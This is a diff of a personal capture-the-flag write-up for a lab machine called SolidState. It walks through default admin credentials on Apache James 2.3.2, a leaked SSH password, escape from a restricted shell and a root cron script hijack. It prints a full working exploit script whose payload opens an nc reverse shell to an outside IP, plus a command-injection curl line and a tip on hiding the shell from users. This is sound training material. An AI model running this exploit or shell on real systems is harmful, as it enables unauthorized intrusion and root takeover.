@@ -1,4 +1,4 @@
-# Machine #9 Jarvis  
+# Machine #12 SolidState  
 
 
 ## Nmap Results  
@@ -41,16 +41,18 @@
 ## Searchsploiting Results   
   <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   
 
-
+* Nothing of significance.
 
 <br/><br/>  
 
 ## Gobustering Stuff  
+
   <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  
 
-
+* No web service to begin with.
 
 <br/><br/>
+
 
 ## Thinking Out Loud   
 
@@ -110,8 +112,6 @@ username: mindy
 pass: P@55W0rd1!2@
 ```  
 
-nc -c bash 10.10.16.6 1234  
-
 
 * James's home  
 
@@ -162,7 +162,10 @@ curl -X POST -d 'name=shodan' -d 'email=jon@gmail.com' -d 'message=get+out+now' 
 	
 curl "http://localhost/index.html?127.0.0.1;ls&#8221;"  
 
-* .... When you start a chroot environment, you are generally already root, so you don't need to use sudo or su root.
+* .... When you start a chroot environment, you are generally already root, so you don't need to use sudo or su root.  
+
+* When  I first sshed with mindy I was in a "restricted shell" but now I'm in a chroot environment and I think I need to get out of it.
+* By default, the server is configured to listen for email transactions on network port 25 and administration transactions on port 4555. And that's what we exactly had on our machine.
 <br/><br/>
 
 
@@ -171,82 +174,112 @@ curl "http://localhost/index.html?127.0.0.1;ls&#8221;"
 
    <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   
 
+   1. The port 4555 had an administration interface that would open if I telnet to it and if I use the default credentials of JAMES's administrative interface root/root it will get me in **(Turns out when I log into here I'm james because he's the mail admin)**.
+   2. From there I can set the passwords to all the users and check their emails. So while checking you notice that in one of the emails james tells john to give mindy restricted persmissions and to send her default creds for ssh.
+   3. So we open mindy's emails to find the username and password for mindy's ssh and this way we can open mindy's ssh.
+   4. With the exploit I found for JAMES 2.3.2 we can escape the restricted shell "rbash" with the reverse shell because I'm creating a "bash" shell not an "rbash" which means I escaped the restriction.
+   5. So after escaping the restriction and after enumeration and researching chroot more than I should've, I use *pspy* to realize that the root is running a python script that I can freely edit, read and execute.
+   6. So I put a python rev shell in it and wait for the root to run it after putting a listening `nc` on another shell. We wait for three minutes and then the root executes the script and I get a rev shell with root privileges.  
+   7. This is the script I used for the JAMES exploit  
+   
+ ```python
+ import socket
+ import sys
+ import time
+
+ # specify payload
+ #payload = 'touch /tmp/proof.txt' # to exploit on any user 
+ payload = 'nc -c bash 10.10.16.6 1234' # to exploit only on root
+ # credentials to James Remote Administration Tool (Default - root/root)
+ user = 'root'
+ pwd = 'root'
+
+ if len(sys.argv) != 2:
+     sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
+     sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
+     sys.exit(1)
+
+ ip = sys.argv[1]
+
+ def recv(s):
+         s.recv(1024)
+         time.sleep(0.2)
+
+ try:
+     print "[+]Connecting to James Remote Administration Tool..."
+     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+     s.connect((ip,4555))
+     s.recv(1024)
+     s.send(user + "\n")
+     s.recv(1024)
+     s.send(pwd + "\n")
+     s.recv(1024)
+     print "[+]Creating user..."
+     s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
+     s.recv(1024)
+     s.send("quit\n")
+     s.close()
+
+     print "[+]Connecting to James SMTP server..."
+     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+     s.connect((ip,25))
+     s.send("ehlo team@team.pl\r\n")
+     recv(s)
+     print "[+]Sending payload..."
+     s.send("mail from: <'@team.pl>\r\n")
+     recv(s)
+     # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
+     s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
+     recv(s)
+     s.send("data\r\n")
+     recv(s)
+     s.send("From: team@team.pl\r\n")
+     s.send("\r\n")
+     s.send("'\n")
+     s.send(payload + "\n")
+     s.send("\r\n.\r\n")
+     recv(s)
+     s.send("quit\r\n")
+     recv(s)
+     s.close()
+     print "[+]Done! Payload will be executed once somebody logs in."
+ except:
+     print "Connection failed."
+ ```   
+
      
 
-## Where I Got Stuck?   
+## Where I Got Stuck?  
+* I kept researching something that is irrelevant which was the chroot even though there was alot of evidence that it was a lost cause. 
    
 
 ## What Did I learn from this Machine?  
-* The ability to telnet should be disabled. 
-* Research the `chroot` thing and why has it given me more privileges than normal mindy.
-
-* SMTP is a message transfer agent whereas POP3 is a message access agent.  
-* SMTP transfers mail from senders computer to the mail box present on receiver's mail server. POP3 it allows to retrieve and organize mails from mailbox on receiver mail server to receiver's computer.  
-* I think that's why I was able to view emails on the POP3 and not on the SMTP.
- 
+  * The ability to telnet should be disabled ( I could've used nc so I don't think that's the real problem here). 
+  * SMTP is a message transfer agent whereas POP3 is a message access agent.  
+  * SMTP transfers mail from senders computer to the mail box present on receiver's mail server. POP3 it allows to retrieve and organize mails from mailbox on receiver mail server to receiver's computer.  
+  * I think that's why I was able to view emails on the POP3 and not on the SMTP.
 
 
-```python
-import socket
-import sys
-import time
+  ### Exposed Administration Console  
+  * Not just that it's exposed it also has the default credentials which are root/root.
 
-# specify payload
-#payload = 'touch /tmp/proof.txt' # to exploit on any user 
-payload = 'nc -c bash 10.10.16.6 1234' # to exploit only on root
-# credentials to James Remote Administration Tool (Default - root/root)
-user = 'root'
-pwd = 'root'
+  ### Vulnerable Version of Apache James Mail Server  
 
-if len(sys.argv) != 2:
-    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
-    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
-    sys.exit(1)
+  * The newest version of Apache James is 3.6.1. Why do we have 2.3.2??? And this version specifically had an exploit that was very very easily executed.
+    
+  ### The fact that I can `telnet`  
 
-ip = sys.argv[1]
+  ### Mindy kept her temporary creds that were given to her by the company     
 
-def recv(s):
-        s.recv(1024)
-        time.sleep(0.2)
+  ### A File executed by root could be Edited by Anyone   
+  * Especially that the file is a python script.
+  * It kept getting executed every 3 minutes by root (UID = 0).
 
-try:
-    print "[+]Connecting to James Remote Administration Tool..."
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip,4555))
-    s.recv(1024)
-    s.send(user + "\n")
-    s.recv(1024)
-    s.send(pwd + "\n")
-    s.recv(1024)
-    print "[+]Creating user..."
-    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
-    s.recv(1024)
-    s.send("quit\n")
-    s.close()
 
-    print "[+]Connecting to James SMTP server..."
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip,25))
-    s.send("ehlo team@team.pl\r\n")
-    recv(s)
-    print "[+]Sending payload..."
-    s.send("mail from: <'@team.pl>\r\n")
-    recv(s)
-    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
-    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
-    recv(s)
-    s.send("data\r\n")
-    recv(s)
-    s.send("From: team@team.pl\r\n")
-    s.send("\r\n")
-    s.send("'\n")
-    s.send(payload + "\n")
-    s.send("\r\n.\r\n")
-    recv(s)
-    s.send("quit\r\n")
-    recv(s)
-    s.close()
-    print "[+]Done! Payload will be executed once somebody logs in."
-except:
-    print "Connection failed."
-```
+
+## Writeups   
+
+* I could've put the `&` at the end of the reverse shell to make it a background process so that the mindy ssh interface won't get hung up. So that if we were in a real world scenario the user won't suspect anything ( or maybe suspect something but at least it's better than the ssh hanging up).   
+
+
+<!--@nested-tags:machines/mail_server/SolidState,machines/weak_creds/SolidState,machines/cron_jobs/Solidstate-->
